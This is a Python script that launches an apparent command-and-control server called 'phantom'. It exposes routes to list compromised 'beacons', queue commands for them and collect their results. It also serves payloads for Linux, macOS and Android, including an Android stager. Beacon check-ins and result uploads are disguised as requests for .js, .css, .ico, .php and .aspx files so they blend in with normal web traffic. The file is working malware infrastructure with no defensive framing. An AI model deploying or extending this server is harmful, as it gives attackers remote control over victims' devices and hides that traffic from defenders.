import sys, os, asyncio
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
os.chdir(os.path.dirname(os.path.abspath(__file__)))

if sys.platform == 'win32':
    asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())

from dotenv import load_dotenv
load_dotenv(os.path.join(os.path.dirname(os.path.abspath(__file__)), '.env'))

from aiohttp import web
import phantom.core.c2_server as srv
import json
from datetime import datetime

async def handle_beacons(request):
    from phantom.core.c2_server import c2_state
    return web.Response(text=json.dumps(c2_state.get_beacons(), indent=2), content_type='application/json')

async def handle_queue_task(request):
    from phantom.core.c2_server import c2_state
    try:
        body = await request.json()
        beacon_id = body.get('beacon_id', '')
        command = body.get('command', '')
        if not beacon_id or not command:
            return web.Response(status=400, text='{"error":"beacon_id and command required"}', content_type='application/json')
        c2_state.queue_task(beacon_id, command)
        return web.Response(text=json.dumps({'status': 'queued'}), content_type='application/json')
    except Exception as e:
        return web.Response(status=400, text=json.dumps({'error': str(e)}), content_type='application/json')

async def handle_results(request):
    from phantom.core.c2_server import c2_state
    beacon_id = request.query.get('beacon_id', '')
    if not beacon_id:
        return web.Response(text=json.dumps({'error': 'beacon_id required'}), content_type='application/json')
    results = c2_state.get_results(beacon_id)
    return web.Response(text=json.dumps({'results': results}, indent=2), content_type='application/json')

app = web.Application(client_max_size=50*1024*1024)

app.router.add_get('/api/v1/beacons', handle_beacons)
app.router.add_post('/api/v1/queue', handle_queue_task)
app.router.add_get('/api/v1/results', handle_results)
app.router.add_get('/api/v1/ping', srv.handle_checkin)
app.router.add_post('/api/v1/ping', srv.handle_checkin)
app.router.add_get(r'/{path:.*\.js}', srv.handle_checkin)
app.router.add_post(r'/{path:.*\.js}', srv.handle_checkin)
app.router.add_get(r'/{path:.*\.css}', srv.handle_checkin)
app.router.add_post(r'/{path:.*\.css}', srv.handle_checkin)
app.router.add_get(r'/{path:.*\.ico}', srv.handle_checkin)
app.router.add_post(r'/{path:.*\.ico}', srv.handle_checkin)
app.router.add_post('/api/v1/result', srv.handle_result)
app.router.add_post(r'/{path:.*\.php}', srv.handle_result)
app.router.add_post(r'/{path:.*\.aspx}', srv.handle_result)
app.router.add_get('/api/v1/payload', srv.handle_payload)
app.router.add_get('/api/v1/payload_linux', srv.handle_payload)
app.router.add_get('/api/v1/payload_linux_x86', srv.handle_payload)
app.router.add_get('/api/v1/payload_macos', srv.handle_payload)
app.router.add_get('/api/v1/payload_android', srv.handle_payload)
app.router.add_get('/s/android', srv.handle_android_stager)
app.router.add_get('/x', srv.handle_payload_pic)

print('READY', flush=True)
web.run_app(app, host='0.0.0.0', port=8080, print=lambda *a: None)
